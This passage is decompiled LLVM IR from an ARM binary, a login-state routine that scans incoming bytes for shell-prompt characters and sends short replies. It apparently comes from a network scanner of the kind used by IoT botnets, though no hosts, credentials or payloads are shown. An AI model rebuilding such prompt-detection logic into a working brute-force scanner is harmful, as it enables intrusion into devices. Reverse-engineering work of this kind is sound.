dec_label_pc_f3e8:                                ; preds = %dec_label_pc_f3d8, %bb439, %dec_label_pc_f3c4, %dec_label_pc_f3bc, %dec_label_pc_f3b4, %dec_label_pc_f3a0, %dec_label_pc_f37c, %dec_label_pc_f398, %dec_label_pc_f390, %bb438
  %v0_f3ec = phi i32 [ %v1_f370, %dec_label_pc_f3a0 ], [ %v1_f370, %dec_label_pc_f37c ], [ %v1_f370, %dec_label_pc_f398 ], [ %v1_f370, %dec_label_pc_f390 ], [ %v1_f370, %bb438 ], [ %v1_f3d0, %dec_label_pc_f3b4 ], [ %v1_f3d0, %dec_label_pc_f3bc ], [ %v1_f3d0, %dec_label_pc_f3c4 ], [ %v1_f3d0, %bb439 ], [ %v1_f3d0, %dec_label_pc_f3d8 ]
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f3ec = add i32 %v0_f3ec, 1
  store i32 %v1_f3ec, i32* @r7, align 4
  %v1_f3f0 = call i32 @function_fd60(i32 8)
  store i32 %v2_f7e4, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_f400 = call i32 @function_fc9c(i32 8, i32* nonnull %stack_var_-60)
  store i32 %v3_f400, i32* %r0.global-to-local, align 4
  %v3_f404 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f404, i32* %r2.global-to-local, align 4
  store i32 %v3_f400, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f410 = load i32, i32* @r6, align 4
  %v1_f410 = add i32 %v0_f410, 4
  %v2_f410 = inttoptr i32 %v1_f410 to i32*
  %v3_f410 = load i32, i32* %v2_f410, align 4
  store i32 %v3_f410, i32* %r0.global-to-local, align 4
  %v4_f414 = call i32 @function_11528(i32 %v3_f410, i32 %v3_f400, i32 %v3_f404, i32 16384)
  store i32 %v4_f414, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16214.187 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f424 = load i32, i32* @r6, align 4
  %v1_f424 = add i32 %v0_f424, 4
  %v2_f424 = inttoptr i32 %v1_f424 to i32*
  %v3_f424 = load i32, i32* %v2_f424, align 4
  store i32 %v3_f424, i32* %r0.global-to-local, align 4
  %v4_f428 = call i32 @function_11528(i32 %v3_f424, i32 ptrtoint ([3 x i8]* @global_var_16214.187 to i32), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f430 = call i32 @function_fcc0(i32 8)
  store i32 %v1_f430, i32* %r0.global-to-local, align 4
  store i32 7, i32* @r3, align 4
  %v1_f438 = load i32, i32* @r6, align 4
  %v2_f438 = add i32 %v1_f438, 12
  %v3_f438 = inttoptr i32 %v2_f438 to i32*
  store i32 7, i32* %v3_f438, align 4
  br label %dec_label_pc_f0cc

dec_label_pc_f440:                                ; preds = %dec_label_pc_efb0
  %v1_f440 = add i32 %v0_efb0, 24
  %v2_f440 = inttoptr i32 %v1_f440 to i32*
  %v3_f440 = load i32, i32* %v2_f440, align 4
  store i32 %v3_f440, i32* %r2.global-to-local, align 4
  %v1_f444 = add i32 %v3_f440, -1
  store i32 %v1_f444, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f448 = icmp eq i32 %v1_f444, 0
  store i1 %v2_f448, i1* %cpsr_z.global-to-local, align 1
  %tmp440 = icmp slt i32 %v1_f444, 1
  br i1 %tmp440, label %dec_label_pc_ef34.backedge.thread, label %dec_label_pc_f450

dec_label_pc_f450:                                ; preds = %dec_label_pc_f440
  %v2_f450 = add i32 %v1_f444, %v0_efb0
  store i32 %v2_f450, i32* %r3.global-to-local, align 4
  %v1_f454 = add i32 %v2_f450, 28
  %v2_f454 = inttoptr i32 %v1_f454 to i8*
  %v3_f454 = load i8, i8* %v2_f454, align 1
  %v4_f454 = zext i8 %v3_f454 to i32
  store i32 %v4_f454, i32* %r3.global-to-local, align 4
  %v2_f458 = icmp ugt i8 %v3_f454, 61
  store i1 %v2_f458, i1* %cpsr_c.global-to-local, align 1
  %v7_f458 = icmp eq i8 %v3_f454, 62
  store i1 %v7_f458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f458, label %dec_label_pc_f4bc, label %bb441

bb441:                                            ; preds = %dec_label_pc_f450
  %v3_f45c = icmp ugt i8 %v3_f454, 57
  store i1 %v3_f45c, i1* %cpsr_c.global-to-local, align 1
  %v8_f45c = icmp eq i8 %v3_f454, 58
  store i1 %v8_f45c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f45c, label %dec_label_pc_f4bc, label %dec_label_pc_f464

dec_label_pc_f464:                                ; preds = %bb441
  %v2_f464 = icmp ugt i8 %v3_f454, 35
  store i1 %v2_f464, i1* %cpsr_c.global-to-local, align 1
  %v7_f464 = icmp eq i8 %v3_f454, 36
  store i1 %v7_f464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f464, label %dec_label_pc_f4bc, label %dec_label_pc_f46c

dec_label_pc_f46c:                                ; preds = %dec_label_pc_f464
  %v2_f46c = icmp ugt i8 %v3_f454, 34
  store i1 %v2_f46c, i1* %cpsr_c.global-to-local, align 1
  %v7_f46c = icmp eq i8 %v3_f454, 35
  store i1 %v7_f46c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f46c, label %dec_label_pc_f4bc, label %dec_label_pc_f474

dec_label_pc_f474:                                ; preds = %dec_label_pc_f46c
  %v2_f474 = icmp ugt i8 %v3_f454, 36
  store i1 %v2_f474, i1* %cpsr_c.global-to-local, align 1
  %v7_f474 = icmp eq i8 %v3_f454, 37
  store i1 %v7_f474, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f474, label %dec_label_pc_f4bc, label %dec_label_pc_f4a4.preheader

dec_label_pc_f4a4.preheader:                      ; preds = %dec_label_pc_f474
  %v3_f478 = add i32 %v0_efb0, 28
  %v2_f47c = add i32 %v3_f478, %v3_f440
  store i32 %v2_f47c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f4a4

dec_label_pc_f488:                                ; preds = %bb442
  %v2_f488 = icmp ugt i8 %v3_f4ac, 35
  store i1 %v2_f488, i1* %cpsr_c.global-to-local, align 1
  %v7_f488 = icmp eq i8 %v3_f4ac, 36
  store i1 %v7_f488, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f488, label %dec_label_pc_f4bc, label %dec_label_pc_f490

dec_label_pc_f490:                                ; preds = %dec_label_pc_f488
  %v2_f490 = icmp ugt i8 %v3_f4ac, 34
  store i1 %v2_f490, i1* %cpsr_c.global-to-local, align 1
  %v7_f490 = icmp eq i8 %v3_f4ac, 35
  store i1 %v7_f490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f490, label %dec_label_pc_f4bc, label %dec_label_pc_f498

dec_label_pc_f498:                                ; preds = %dec_label_pc_f490
  %v2_f498 = icmp ugt i8 %v3_f4ac, 36
  store i1 %v2_f498, i1* %cpsr_c.global-to-local, align 1
  %v7_f498 = icmp eq i8 %v3_f4ac, 37
  store i1 %v7_f498, i1* %cpsr_z.global-to-local, align 1
  %v1_f49c = add i32 %v0_f49c, -1
  store i32 %v1_f49c, i32* %r3.global-to-local, align 4
  br i1 %v7_f498, label %dec_label_pc_f4bc, label %dec_label_pc_f4a4

dec_label_pc_f4a4:                                ; preds = %dec_label_pc_f4a4.preheader, %dec_label_pc_f498
  %v0_f49c = phi i32 [ %v2_f47c, %dec_label_pc_f4a4.preheader ], [ %v1_f49c, %dec_label_pc_f498 ]
  %v0_f4a4 = phi i32 [ %v1_f444, %dec_label_pc_f4a4.preheader ], [ %v1_f4a4, %dec_label_pc_f498 ]
  %v1_f4a4 = add i32 %v0_f4a4, -1
  store i32 %v1_f4a4, i32* %r1.global-to-local, align 4
  %v2_f4a4 = icmp ne i32 %v0_f4a4, 0
  store i1 %v2_f4a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f4a4 = icmp eq i32 %v0_f4a4, 1
  store i1 %v7_f4a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4a4, label %dec_label_pc_ef34.backedge.thread561, label %dec_label_pc_f4ac

dec_label_pc_f4ac:                                ; preds = %dec_label_pc_f4a4
  %v1_f4ac = add i32 %v0_f49c, -2
  %v2_f4ac = inttoptr i32 %v1_f4ac to i8*
  %v3_f4ac = load i8, i8* %v2_f4ac, align 1
  %v4_f4ac = zext i8 %v3_f4ac to i32
  store i32 %v4_f4ac, i32* %r2.global-to-local, align 4
  %v2_f4b0 = icmp ugt i8 %v3_f4ac, 61
  store i1 %v2_f4b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f4b0 = icmp eq i8 %v3_f4ac, 62
  store i1 %v7_f4b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4b0, label %dec_label_pc_f4bc, label %bb442

bb442:                                            ; preds = %dec_label_pc_f4ac
  %v3_f4b4 = icmp ugt i8 %v3_f4ac, 57
  store i1 %v3_f4b4, i1* %cpsr_c.global-to-local, align 1
  %v8_f4b4 = icmp eq i8 %v3_f4ac, 58
  store i1 %v8_f4b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f4b4, label %dec_label_pc_f4bc, label %dec_label_pc_f488

dec_label_pc_f4bc:                                ; preds = %dec_label_pc_f4ac, %bb442, %dec_label_pc_f498, %dec_label_pc_f490, %dec_label_pc_f488, %dec_label_pc_f474, %dec_label_pc_f450, %dec_label_pc_f46c, %dec_label_pc_f464, %bb441
  %v0_f4c0 = phi i32 [ %v1_f444, %dec_label_pc_f474 ], [ %v1_f444, %dec_label_pc_f450 ], [ %v1_f444, %dec_label_pc_f46c ], [ %v1_f444, %dec_label_pc_f464 ], [ %v1_f444, %bb441 ], [ %v1_f4a4, %dec_label_pc_f488 ], [ %v1_f4a4, %dec_label_pc_f490 ], [ %v1_f4a4, %dec_label_pc_f498 ], [ %v1_f4a4, %bb442 ], [ %v1_f4a4, %dec_label_pc_f4ac ]
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_f4c0 = add i32 %v0_f4c0, 1
  store i32 %v1_f4c0, i32* @r7, align 4
  %v1_f4c4 = call i32 @function_fd60(i32 7)
  store i32 %v2_f7e4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_f4d4 = call i32 @function_fc9c(i32 7, i32* nonnull %stack_var_-60)
  store i32 %v3_f4d4, i32* %r0.global-to-local, align 4
  %v3_f4d8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f4d8, i32* %r2.global-to-local, align 4
  store i32 %v3_f4d4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f4e4 = load i32, i32* @r6, align 4
  %v1_f4e4 = add i32 %v0_f4e4, 4
  %v2_f4e4 = inttoptr i32 %v1_f4e4 to i32*
  %v3_f4e4 = load i32, i32* %v2_f4e4, align 4
  store i32 %v3_f4e4, i32* %r0.global-to-local, align 4
  %v4_f4e8 = call i32 @function_11528(i32 %v3_f4e4, i32 %v3_f4d4, i32 %v3_f4d8, i32 16384)
  store i32 %v4_f4e8, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16214.187 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f4f8 = load i32, i32* @r6, align 4
  %v1_f4f8 = add i32 %v0_f4f8, 4
  %v2_f4f8 = inttoptr i32 %v1_f4f8 to i32*
  %v3_f4f8 = load i32, i32* %v2_f4f8, align 4
  store i32 %v3_f4f8, i32* %r0.global-to-local, align 4
  %v4_f4fc = call i32 @function_11528(i32 %v3_f4f8, i32 ptrtoint ([3 x i8]* @global_var_16214.187 to i32), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_f504 = call i32 @function_fcc0(i32 7)
  store i32 %v1_f504, i32* %r0.global-to-local, align 4
  store i32 6, i32* @r3, align 4
  %v1_f50c = load i32, i32* @r6, align 4
  %v2_f50c = add i32 %v1_f50c, 12
  %v3_f50c = inttoptr i32 %v2_f50c to i32*
  store i32 6, i32* %v3_f50c, align 4
  br label %dec_label_pc_f0cc

dec_label_pc_f58c:                                ; preds = %dec_label_pc_efb0
  %v1_f58c = add i32 %v0_efb0, 24
  %v2_f58c = inttoptr i32 %v1_f58c to i32*
  %v3_f58c = load i32, i32* %v2_f58c, align 4
  store i32 %v3_f58c, i32* %r2.global-to-local, align 4
  %v1_f590 = add i32 %v3_f58c, -1
  store i32 %v1_f590, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f594 = icmp eq i32 %v1_f590, 0
  store i1 %v2_f594, i1* %cpsr_z.global-to-local, align 1
  %tmp443 = icmp slt i32 %v1_f590, 1
  br i1 %tmp443, label %dec_label_pc_ef34.backedge.thread, label %dec_label_pc_f59c

dec_label_pc_f59c:                                ; preds = %dec_label_pc_f58c
  %v2_f59c = add i32 %v1_f590, %v0_efb0
  store i32 %v2_f59c, i32* %r3.global-to-local, align 4
  %v1_f5a0 = add i32 %v2_f59c, 28
  %v2_f5a0 = inttoptr i32 %v1_f5a0 to i8*
  %v3_f5a0 = load i8, i8* %v2_f5a0, align 1
  %v4_f5a0 = zext i8 %v3_f5a0 to i32
  store i32 %v4_f5a0, i32* %r3.global-to-local, align 4
  %v2_f5a4 = icmp ugt i8 %v3_f5a0, 61
  store i1 %v2_f5a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5a4 = icmp eq i8 %v3_f5a0, 62
  store i1 %v7_f5a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5a4, label %dec_label_pc_f608, label %bb444

bb444:                                            ; preds = %dec_label_pc_f59c
  %v3_f5a8 = icmp ugt i8 %v3_f5a0, 57
  store i1 %v3_f5a8, i1* %cpsr_c.global-to-local, align 1
  %v8_f5a8 = icmp eq i8 %v3_f5a0, 58
  store i1 %v8_f5a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f5a8, label %dec_label_pc_f608, label %dec_label_pc_f5b0

dec_label_pc_f5b0:                                ; preds = %bb444
  %v2_f5b0 = icmp ugt i8 %v3_f5a0, 35
  store i1 %v2_f5b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f5b0 = icmp eq i8 %v3_f5a0, 36
  store i1 %v7_f5b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5b0, label %dec_label_pc_f608, label %dec_label_pc_f5b8

dec_label_pc_f5b8:                                ; preds = %dec_label_pc_f5b0
  %v2_f5b8 = icmp ugt i8 %v3_f5a0, 34
  store i1 %v2_f5b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f5b8 = icmp eq i8 %v3_f5a0, 35
  store i1 %v7_f5b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5b8, label %dec_label_pc_f608, label %dec_label_pc_f5c0

dec_label_pc_f5c0:                                ; preds = %dec_label_pc_f5b8
  %v2_f5c0 = icmp ugt i8 %v3_f5a0, 36
  store i1 %v2_f5c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f5c0 = icmp eq i8 %v3_f5a0, 37
  store i1 %v7_f5c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5c0, label %dec_label_pc_f608, label %dec_label_pc_f5f0.preheader

dec_label_pc_f5f0.preheader:                      ; preds = %dec_label_pc_f5c0
  %v3_f5c4 = add i32 %v0_efb0, 28
  %v2_f5c8 = add i32 %v3_f5c4, %v3_f58c
  store i32 %v2_f5c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f5f0

dec_label_pc_f5d4:                                ; preds = %bb445
  %v2_f5d4 = icmp ugt i8 %v3_f5f8, 35
  store i1 %v2_f5d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5d4 = icmp eq i8 %v3_f5f8, 36
  store i1 %v7_f5d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5d4, label %dec_label_pc_f608, label %dec_label_pc_f5dc

dec_label_pc_f5dc:                                ; preds = %dec_label_pc_f5d4
  %v2_f5dc = icmp ugt i8 %v3_f5f8, 34
  store i1 %v2_f5dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f5dc = icmp eq i8 %v3_f5f8, 35
  store i1 %v7_f5dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5dc, label %dec_label_pc_f608, label %dec_label_pc_f5e4

dec_label_pc_f5e4:                                ; preds = %dec_label_pc_f5dc
  %v2_f5e4 = icmp ugt i8 %v3_f5f8, 36
  store i1 %v2_f5e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5e4 = icmp eq i8 %v3_f5f8, 37
  store i1 %v7_f5e4, i1* %cpsr_z.global-to-local, align 1
  %v1_f5e8 = add i32 %v0_f5e8, -1
  store i32 %v1_f5e8, i32* %r3.global-to-local, align 4
  br i1 %v7_f5e4, label %dec_label_pc_f608, label %dec_label_pc_f5f0

dec_label_pc_f5f0:                                ; preds = %dec_label_pc_f5f0.preheader, %dec_label_pc_f5e4
  %v0_f5e8 = phi i32 [ %v2_f5c8, %dec_label_pc_f5f0.preheader ], [ %v1_f5e8, %dec_label_pc_f5e4 ]
  %v0_f5f0 = phi i32 [ %v1_f590, %dec_label_pc_f5f0.preheader ], [ %v1_f5f0, %dec_label_pc_f5e4 ]
  %v1_f5f0 = add i32 %v0_f5f0, -1
  store i32 %v1_f5f0, i32* %r1.global-to-local, align 4
  %v2_f5f0 = icmp ne i32 %v0_f5f0, 0
  store i1 %v2_f5f0, i1* %cpsr_c.global-to-local, align 1
  %v7_f5f0 = icmp eq i32 %v0_f5f0, 1
  store i1 %v7_f5f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5f0, label %dec_label_pc_ef34.backedge.thread561, label %dec_label_pc_f5f8

dec_label_pc_f5f8:                                ; preds = %dec_label_pc_f5f0
  %v1_f5f8 = add i32 %v0_f5e8, -2
  %v2_f5f8 = inttoptr i32 %v1_f5f8 to i8*
  %v3_f5f8 = load i8, i8* %v2_f5f8, align 1
  %v4_f5f8 = zext i8 %v3_f5f8 to i32
  store i32 %v4_f5f8, i32* %r2.global-to-local, align 4
  %v2_f5fc = icmp ugt i8 %v3_f5f8, 61
  store i1 %v2_f5fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f5fc = icmp eq i8 %v3_f5f8, 62
  store i1 %v7_f5fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5fc, label %dec_label_pc_f608, label %bb445

bb445:                                            ; preds = %dec_label_pc_f5f8
  %v3_f600 = icmp ugt i8 %v3_f5f8, 57
  store i1 %v3_f600, i1* %cpsr_c.global-to-local, align 1
  %v8_f600 = icmp eq i8 %v3_f5f8, 58
  store i1 %v8_f600, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f600, label %dec_label_pc_f608, label %dec_label_pc_f5d4

dec_label_pc_f608:                                ; preds = %dec_label_pc_f5f8, %bb445, %dec_label_pc_f5e4, %dec_label_pc_f5dc, %dec_label_pc_f5d4, %dec_label_pc_f5c0, %dec_label_pc_f59c, %dec_label_pc_f5b8, %dec_label_pc_f5b0, %bb444
  %v0_f60c = phi i32 [ %v1_f590, %dec_label_pc_f5c0 ], [ %v1_f590, %dec_label_pc_f59c ], [ %v1_f590, %dec_label_pc_f5b8 ], [ %v1_f590, %dec_label_pc_f5b0 ], [ %v1_f590, %bb444 ], [ %v1_f5f0, %dec_label_pc_f5d4 ], [ %v1_f5f0, %dec_label_pc_f5dc ], [ %v1_f5f0, %dec_label_pc_f5e4 ], [ %v1_f5f0, %bb445 ], [ %v1_f5f0, %dec_label_pc_f5f8 ]
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f60c = add i32 %v0_f60c, 1
  store i32 %v1_f60c, i32* @r7, align 4
  %v1_f610 = call i32 @function_fd60(i32 6)
  store i32 %v2_f7e4, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_f620 = call i32 @function_fc9c(i32 6, i32* nonnull %stack_var_-60)
  store i32 %v3_f620, i32* %r0.global-to-local, align 4
  %v3_f624 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f624, i32* %r2.global-to-local, align 4
  store i32 %v3_f620, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f630 = load i32, i32* @r6, align 4
  %v1_f630 = add i32 %v0_f630, 4
  %v2_f630 = inttoptr i32 %v1_f630 to i32*
  %v3_f630 = load i32, i32* %v2_f630, align 4
  store i32 %v3_f630, i32* %r0.global-to-local, align 4
  %v4_f634 = call i32 @function_11528(i32 %v3_f630, i32 %v3_f620, i32 %v3_f624, i32 16384)
  store i32 %v4_f634, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16214.187 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f644 = load i32, i32* @r6, align 4
  %v1_f644 = add i32 %v0_f644, 4
  %v2_f644 = inttoptr i32 %v1_f644 to i32*
  %v3_f644 = load i32, i32* %v2_f644, align 4
  store i32 %v3_f644, i32* %r0.global-to-local, align 4
  %v4_f648 = call i32 @function_11528(i32 %v3_f644, i32 ptrtoint ([3 x i8]* @global_var_16214.187 to i32), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f650 = call i32 @function_fcc0(i32 6)
  store i32 %v1_f650, i32* %r0.global-to-local, align 4
  store i32 8, i32* @r3, align 4
  %v1_f658 = load i32, i32* @r6, align 4
  %v2_f658 = add i32 %v1_f658, 12
  %v3_f658 = inttoptr i32 %v2_f658 to i32*
  store i32 8, i32* %v3_f658, align 4
  br label %dec_label_pc_f0cc

dec_label_pc_f660:                                ; preds = %dec_label_pc_efb0
  %v1_f660 = add i32 %v0_efb0, 24
  %v2_f660 = inttoptr i32 %v1_f660 to i32*
  %v3_f660 = load i32, i32* %v2_f660, align 4
  store i32 %v3_f660, i32* %r2.global-to-local, align 4
  %v1_f664 = add i32 %v3_f660, -1
  store i32 %v1_f664, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f668 = icmp eq i32 %v1_f664, 0
  store i1 %v2_f668, i1* %cpsr_z.global-to-local, align 1
  %tmp446 = icmp slt i32 %v1_f664, 1
  br i1 %tmp446, label %dec_label_pc_f6cc, label %dec_label_pc_f670

dec_label_pc_f670:                                ; preds = %dec_label_pc_f660
  %v2_f670 = add i32 %v1_f664, %v0_efb0
  store i32 %v2_f670, i32* %r3.global-to-local, align 4
  %v1_f674 = add i32 %v2_f670, 28
  %v2_f674 = inttoptr i32 %v1_f674 to i8*
  %v3_f674 = load i8, i8* %v2_f674, align 1
  %v4_f674 = zext i8 %v3_f674 to i32
  store i32 %v4_f674, i32* %r3.global-to-local, align 4
  %v2_f678 = icmp ugt i8 %v3_f674, 61
  store i1 %v2_f678, i1* %cpsr_c.global-to-local, align 1
  %v7_f678 = icmp eq i8 %v3_f674, 62
  store i1 %v7_f678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f678, label %dec_label_pc_f934, label %bb447

bb447:                                            ; preds = %dec_label_pc_f670
  %v3_f67c = icmp ugt i8 %v3_f674, 57
  store i1 %v3_f67c, i1* %cpsr_c.global-to-local, align 1
  %v8_f67c = icmp eq i8 %v3_f674, 58
  store i1 %v8_f67c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f67c, label %dec_label_pc_f934, label %dec_label_pc_f684

dec_label_pc_f684:                                ; preds = %bb447
  %v2_f684 = icmp ugt i8 %v3_f674, 35
  store i1 %v2_f684, i1* %cpsr_c.global-to-local, align 1
  %v7_f684 = icmp eq i8 %v3_f674, 36
  store i1 %v7_f684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f684, label %dec_label_pc_f934, label %dec_label_pc_f68c

dec_label_pc_f68c:                                ; preds = %dec_label_pc_f684
  %v2_f68c = icmp ugt i8 %v3_f674, 34
  store i1 %v2_f68c, i1* %cpsr_c.global-to-local, align 1
  %v7_f68c = icmp eq i8 %v3_f674, 35
  store i1 %v7_f68c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f68c, label %dec_label_pc_f934, label %dec_label_pc_f6c4.preheader

dec_label_pc_f6c4.preheader:                      ; preds = %dec_label_pc_f68c
  %v3_f690 = add i32 %v0_efb0, 28
  %v2_f694 = add i32 %v3_f690, %v3_f660
  store i32 %v2_f694, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f6c4

dec_label_pc_f6a0:                                ; preds = %dec_label_pc_f6c4
  %v1_f6a0 = add i32 %v0_f6bc, -2
  %v2_f6a0 = inttoptr i32 %v1_f6a0 to i8*
  %v3_f6a0 = load i8, i8* %v2_f6a0, align 1
  %v4_f6a0 = zext i8 %v3_f6a0 to i32
  store i32 %v4_f6a0, i32* %r2.global-to-local, align 4
  %v2_f6a4 = icmp ugt i8 %v3_f6a0, 61
  store i1 %v2_f6a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f6a4 = icmp eq i8 %v3_f6a0, 62
  store i1 %v7_f6a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6a4, label %dec_label_pc_f934, label %bb448

bb448:                                            ; preds = %dec_label_pc_f6a0
  %v3_f6a8 = icmp ugt i8 %v3_f6a0, 57
  store i1 %v3_f6a8, i1* %cpsr_c.global-to-local, align 1
  %v8_f6a8 = icmp eq i8 %v3_f6a0, 58
  store i1 %v8_f6a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f6a8, label %dec_label_pc_f934, label %dec_label_pc_f6b0

dec_label_pc_f6b0:                                ; preds = %bb448
  %v2_f6b0 = icmp ugt i8 %v3_f6a0, 35
  store i1 %v2_f6b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f6b0 = icmp eq i8 %v3_f6a0, 36
  store i1 %v7_f6b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6b0, label %dec_label_pc_f934, label %dec_label_pc_f6b8

dec_label_pc_f6b8:                                ; preds = %dec_label_pc_f6b0
  %v2_f6b8 = icmp ugt i8 %v3_f6a0, 34
  store i1 %v2_f6b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f6b8 = icmp eq i8 %v3_f6a0, 35
  store i1 %v7_f6b8, i1* %cpsr_z.global-to-local, align 1
  %v1_f6bc = add i32 %v0_f6bc, -1
  store i32 %v1_f6bc, i32* %r3.global-to-local, align 4
  br i1 %v7_f6b8, label %dec_label_pc_f934, label %dec_label_pc_f6c4

dec_label_pc_f6c4:                                ; preds = %dec_label_pc_f6c4.preheader, %dec_label_pc_f6b8
  %v0_f6bc = phi i32 [ %v2_f694, %dec_label_pc_f6c4.preheader ], [ %v1_f6bc, %dec_label_pc_f6b8 ]
  %v0_f6c4 = phi i32 [ %v1_f664, %dec_label_pc_f6c4.preheader ], [ %v1_f6c4, %dec_label_pc_f6b8 ]
  %v1_f6c4 = add i32 %v0_f6c4, -1
  store i32 %v1_f6c4, i32* %r1.global-to-local, align 4
  %v2_f6c4 = icmp ne i32 %v0_f6c4, 0
  store i1 %v2_f6c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f6c4 = icmp eq i32 %v0_f6c4, 1
  store i1 %v7_f6c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6c4, label %dec_label_pc_f6cc, label %dec_label_pc_f6a0

dec_label_pc_f6cc:                                ; preds = %dec_label_pc_f6c4, %dec_label_pc_f660
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_f6d0 = call i32 @function_fd60(i32 28)
  store i32 %v2_f7e4, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  %v3_f6e0 = call i32 @function_fc9c(i32 28, i32* nonnull %stack_var_-60)
  %v3_f6e4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f6e0, i32* %r2.global-to-local, align 4
  %v1_f6ec = add i32 %v3_f6e4, -1
  store i32 %v1_f6ec, i32* %r3.global-to-local, align 4
  %v0_f6f0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f6f0, i32* %r0.global-to-local, align 4
  %v0_f6f4 = load i32, i32* @r6, align 4
  %v1_f6f4 = add i32 %v0_f6f4, 24
  %v2_f6f4 = inttoptr i32 %v1_f6f4 to i32*
  %v3_f6f4 = load i32, i32* %v2_f6f4, align 4
  store i32 %v3_f6f4, i32* %r1.global-to-local, align 4
  %v4_f6f8 = call i32 @function_103d0(i32 %v0_f6f0, i32 %v3_f6f4, i32 %v3_f6e0, i32 %v1_f6ec)
  store i32 %v4_f6f8, i32* %r0.global-to-local, align 4
  %v1_f6fc = add i32 %v4_f6f8, 1
  store i32 %v1_f6fc, i32* @r7, align 4
  %v2_f6fc = icmp eq i32 %v4_f6f8, -1
  store i1 %v2_f6fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f6fc = icmp eq i32 %v1_f6fc, 0
  store i1 %v7_f6fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6fc, label %thread-pre-split124, label %bb449

bb449:                                            ; preds = %dec_label_pc_f6cc
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split124

thread-pre-split124:                              ; preds = %dec_label_pc_f6cc, %bb449
  %v0_f704 = phi i1 [ false, %bb449 ], [ true, %dec_label_pc_f6cc ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_f704, i1* %cpsr_z.global-to-local, align 1
  store i32 28, i32* %r0.global-to-local, align 4
